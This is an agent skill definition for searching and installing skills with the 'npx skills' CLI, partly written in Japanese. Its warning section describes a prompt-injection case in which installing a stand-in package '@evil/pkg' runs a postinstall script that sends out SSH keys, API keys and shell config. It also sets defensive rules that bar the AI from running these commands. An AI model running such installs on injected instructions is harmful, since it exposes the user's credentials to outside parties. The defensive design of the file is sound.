---
name: find-skills
description: Discover and install agent skills from the ecosystem. Use when the user asks "how do I do X", "find a skill for X", or wants to extend capabilities with an installable skill.
allowed-tools: [Read, Glob, Grep, Bash]
---

# Find Skills

This skill helps you discover and install skills from the open agent skills ecosystem.

## ⚠️ 実行方法（必読・AI 自律発火禁止）

`npx skills *` は hook (`~/.claude/hooks/block-host-installs.py`) で **AI からの実行が構造上 DENY** される。
理由: `! npx skills add` の postinstall は任意 RCE 可能。Prompt Injection で `! npx skills add @evil/pkg` を踏むと SSH 鍵・~/.mcp.json (APIキー)・~/.zshrc が外部送信される。

**AI の役割**: クエリを組み立て、ユーザーに `!` プレフィックス付きコマンドを**提示するのみ**。AI が直接 Bash で実行してはいけない。

```
# AI が出力する例（ユーザーがコピペ実行する想定）:
! npx skills find "react performance"
! npx skills add @some-org/some-skill
```

ユーザーは `!` プレフィックスでセッションシェル直接実行（permission system バイパス）→ hook 経由しないため動作。

## When to Use This Skill

Use this skill when the user:

- Asks "how do I do X" where X might be a common task with an existing skill
- Says "find a skill for X" or "is there a skill for X"
- Asks "can you do X" where X is a specialized capability
- Expresses interest in extending agent capabilities
- Wants to search for tools, templates, or workflows
- Mentions they wish they had help with a specific domain (design, testing, deployment, etc.)

## What is the Skills CLI?

The Skills CLI is the package manager for the open agent skills ecosystem. Skills are modular packages that extend agent capabilities with specialized knowledge, workflows, and tools.

**Key commands (ユーザーが `!` プレフィックスで実行):**

- `! npx skills find [query]` - Search for skills interactively or by keyword
- `! npx skills add <package>` - Install a skill from GitHub or other sources
- `! npx skills check` - Check for skill updates
- `! npx skills update` - Update all installed skills

**AI は上記コマンドを Bash で直接実行しないこと**（hook が DENY）。ユーザーに提示するのみ。

**Browse skills at:** https://skills.sh/

## How to Help Users Find Skills

### Step 1: Understand What They Need

When a user asks for help with something, identify:

1. The domain (e.g., React, testing, design, deployment)
2. The specific task (e.g., writing tests, creating animations, reviewing PRs)
3. Whether this is a common enough task that a skill likely exists

### Step 2: Search for Skills

ユーザーに以下の形式でコマンドを提示する (AI 自身は Bash 実行しない):

```
! npx skills find [query]
```

For example:

- User asks "how do I make my React app faster?" → `! npx skills find react performance`
- User asks "can you help me with PR reviews?" → `! npx skills find pr review`
- User asks "I need to create a changelog" → `! npx skills find changelog`

The command will return results like:

```
Install with npx skills add <owner/repo@skill>

vercel-labs/agent-skills@vercel-react-best-practices
└ https://skills.sh/vercel-labs/agent-skills/vercel-react-best-practices
```

### Step 3: Present Options to the User

When you find relevant skills, present them to the user with:

1. The skill name and what it does
2. The install command they can run
3. A link to learn more at skills.sh

Example response:

```
I found a skill that might help! The "vercel-react-best-practices" skill provides
React and Next.js performance optimization guidelines from Vercel Engineering.

To install it:
npx skills add vercel-labs/agent-skills@vercel-react-best-practices

Learn more: https://skills.sh/vercel-labs/agent-skills/vercel-react-best-practices
```

### Step 4: Offer Install Command

If the user wants to proceed, **提示するのみ** (AI 自身は実行不可):

```
! npx skills add <owner/repo@skill> -g -y
```

The `-g` flag installs globally (user-level) and `-y` skips confirmation prompts. ユーザーが `!` プレフィックスでセッションシェル直接実行する。

## Common Skill Categories

When searching, consider these common categories:

| Category        | Example Queries                          |
| --------------- | ---------------------------------------- |
| Web Development | react, nextjs, typescript, css, tailwind |
| Testing         | testing, jest, playwright, e2e           |
| DevOps          | deploy, docker, kubernetes, ci-cd        |
| Documentation   | docs, readme, changelog, api-docs        |
| Code Quality    | review, lint, refactor, best-practices   |
| Design          | ui, ux, design-system, accessibility     |
| Productivity    | workflow, automation, git                |

## Tips for Effective Searches

1. **Use specific keywords**: "react testing" is better than just "testing"
2. **Try alternative terms**: If "deploy" doesn't work, try "deployment" or "ci-cd"
3. **Check popular sources**: Many skills come from `vercel-labs/agent-skills` or `ComposioHQ/awesome-claude-skills`

## When No Skills Are Found

If no relevant skills exist:

1. Acknowledge that no existing skill was found
2. Offer to help with the task directly using your general capabilities
3. Suggest the user could create their own skill with `! npx skills init`

Example:

```
I searched for skills related to "xyz" but didn't find any matches.
I can still help you with this task directly! Would you like me to proceed?

If this is something you do often, you could create your own skill:
! npx skills init my-xyz-skill
```
